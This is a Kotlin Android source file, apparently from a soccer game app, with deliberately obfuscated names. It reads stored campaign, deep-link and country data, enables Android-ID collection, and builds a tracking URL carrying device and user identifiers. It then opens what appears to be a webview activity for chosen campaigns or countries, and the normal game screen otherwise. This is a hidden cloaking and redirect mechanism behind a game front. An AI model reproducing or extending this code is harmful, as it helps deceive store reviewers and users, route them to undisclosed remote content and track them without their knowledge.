package com.generamobile.headsoccerlali.isijhuwdhu
import com.onesignal.OneSignal
import org.json.JSONException
import org.json.JSONObject
import com.generamobile.headsoccerlali.vufrijokdf.Lopsosoksijxhuchusb
import com.generamobile.headsoccerlali.vufrijokdf.Nisijsishuuxcgys
import com.my.tracker.MyTracker
import org.koin.android.ext.android.inject
import org.koin.core.qualifier.named
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import android.os.Bundle
import androidx.fragment.app.Fragment
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import com.appsflyer.AppsFlyerLib
import com.generamobile.headsoccerlali.BuildConfig
import com.generamobile.headsoccerlali.R




class Lopwowijsjhuxygcs : Fragment() {
    private lateinit var ijcxzjiijcjiashucuhas: Context
    val ekorokkosdako: SharedPreferences by inject(named("SharedPreferences"))

    override fun onAttach(context: Context) {
        super.onAttach(context)
        ijcxzjiijcjiashucuhas = context
    }

    private fun fplrpllpdlpsfkookxcv(fokrkodsf: String) {
        OneSignal.setExternalUserId(
            fokrkodsf,
            object : OneSignal.OSExternalUserIdUpdateCompletionHandler {
                override fun onSuccess(mmcxvmijxc: JSONObject) {

                    try {
                        if (mmcxvmijxc.has("push") && mmcxvmijxc.getJSONObject("push").has("success")) {
                            val rokokaokdsko = mmcxvmijxc.getJSONObject("push").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for push status: $rokokaokdsko"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                    try {
                        if (mmcxvmijxc.has("email") && mmcxvmijxc.getJSONObject("email").has("success")) {
                            val bokvbkokojiifjg =
                                mmcxvmijxc.getJSONObject("email").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for email status: $bokvbkokojiifjg"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                    try {
                        if (mmcxvmijxc.has("sms") && mmcxvmijxc.getJSONObject("sms").has("success")) {
                            val paooaksokwjijiudhsahuxc = mmcxvmijxc.getJSONObject("sms").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for sms status: $paooaksokwjijiudhsahuxc"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                }

                override fun onFailure(error: OneSignal.ExternalIdError) {

                    OneSignal.onesignalLog(
                        OneSignal.LOG_LEVEL.VERBOSE,
                        "Set external user id done with error: $error"
                    )
                }
            })
    }

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        return inflater.inflate(R.layout.okwkokodjihunxc, container, false)
    }


    override fun onStart() {
        super.onStart()
        val eopepokoksd = "sub_id_5="
        val rokkoadkos = ekorokkosdako.getString("countryDev", null)
        val palpasplplokokskodwkoijsdia = "deviceID="
        val oykkoykoijdfgji = ekorokkosdako.getString("apps", null)
        val okwkowkokodjiiasjd = "deeporg"
        val xpxlplpxcisjisaji = "sub_id_6="
        val uzxchxij = "naming"
        val apdlplalpkokookxzc = BuildConfig.APPLICATION_ID
        val rdplsfl = "ad_id="
        val mmxcmvkkxcuisduhsdhu = Build.VERSION.RELEASE
        val mmmmxczkmzxijashuuuhfds = AppsFlyerLib.getInstance().getAppsFlyerUID(ijcxzjiijcjiashucuhas)
        AppsFlyerLib.getInstance().setCollectAndroidID(true)
        val asijdjiasd = ekorokkosdako.getString("country", null)
        val rokkodf = ekorokkosdako.getString("appCamp", null)
        val jnxcvjnjxcnjisdhud = ekorokkosdako.getString("deepSt", null)

        val bcvnbij = ekorokkosdako.getString("wv", null)
        val okfkookcxkovko = "sub_id_4="
        val wokwkokosdjijizxhuchuxz = ekorokkosdako.getString("mainId", null)

        val rokeokodkf = MyTracker.getTrackerParams()
        rokeokodkf.customUserId = wokwkokosdjijizxhuchuxz
        val jnvxc = "sub_id_1="
        val jwuudhsadhugy: String? = ekorokkosdako.getString("instId", null)

        val nxcvijivcjixisdkosodk = Intent(ijcxzjiijcjiashucuhas, Lopsosoksijxhuchusb::class.java)
        val tokorkkookd = Intent(ijcxzjiijcjiashucuhas, Nisijsishuuxcgys::class.java)

        fplrpllpdlpsfkookxcv(wokwkokosdjijizxhuchuxz.toString())


        val ywuwijs = "$bcvnbij$jnvxc$rokkodf&$palpasplplokokskodwkoijsdia$mmmmxczkmzxijashuuuhfds&$rdplsfl$wokwkokosdjijizxhuchuxz&$okfkookcxkovko$apdlplalpkokookxzc&$eopepokoksd$mmxcmvkkxcuisduhsdhu&$xpxlplpxcisjisaji$uzxchxij"
        val papapaoskkodwjiijdsahux = "$bcvnbij$palpasplplokokskodwkoijsdia$wokwkokosdjijizxhuchuxz&$rdplsfl$jwuudhsadhugy&$okfkookcxkovko$apdlplalpkokookxzc&$eopepokoksd$mmxcmvkkxcuisduhsdhu&$xpxlplpxcisjisaji$uzxchxij"
        val nncxnhvijidsji = "$bcvnbij$jnvxc$jnxcvjnjxcnjisdhud&$palpasplplokokskodwkoijsdia$mmmmxczkmzxijashuuuhfds&$rdplsfl$wokwkokosdjijizxhuchuxz&$okfkookcxkovko$apdlplalpkokookxzc&$eopepokoksd$mmxcmvkkxcuisduhsdhu&$xpxlplpxcisjisaji$okwkowkokodjiiasjd"
        val eokskoadkoas = "$bcvnbij$jnvxc$jnxcvjnjxcnjisdhud&$palpasplplokokskodwkoijsdia$wokwkokosdjijizxhuchuxz&$rdplsfl$jwuudhsadhugy&$okfkookcxkovko$apdlplalpkokookxzc&$eopepokoksd$mmxcmvkkxcuisduhsdhu&$xpxlplpxcisjisaji$okwkowkokodjiiasjd"

        when(oykkoykoijdfgji) {
            "1" ->
                if(rokkodf!= "null") {
                    ekorokkosdako.edit().putString("link", ywuwijs).apply()
                    startActivity(nxcvijivcjixisdkosodk)
                    activity?.finish()
                } else if (jnxcvjnjxcnjisdhud!=null||rokkoadkos!!.contains(asijdjiasd.toString())) {
                    ekorokkosdako.edit().putString("link", nncxnhvijidsji).apply()
                    startActivity(nxcvijivcjixisdkosodk)
                    activity?.finish()
                } else {
                    startActivity(tokorkkookd)
                    activity?.finish()
                }
            "0" ->
                if(jnxcvjnjxcnjisdhud!=null) {
                    ekorokkosdako.edit().putString("link", eokskoadkoas).apply()
                    startActivity(nxcvijivcjixisdkosodk)
                    activity?.finish()
                } else if (rokkoadkos!!.contains(asijdjiasd.toString())) {
                    ekorokkosdako.edit().putString("link", papapaoskkodwjiijdsahux).apply()
                    startActivity(nxcvijivcjixisdkosodk)
                    activity?.finish()
                } else {
                    startActivity(tokorkkookd)
                    activity?.finish()
                }
        }
    }

}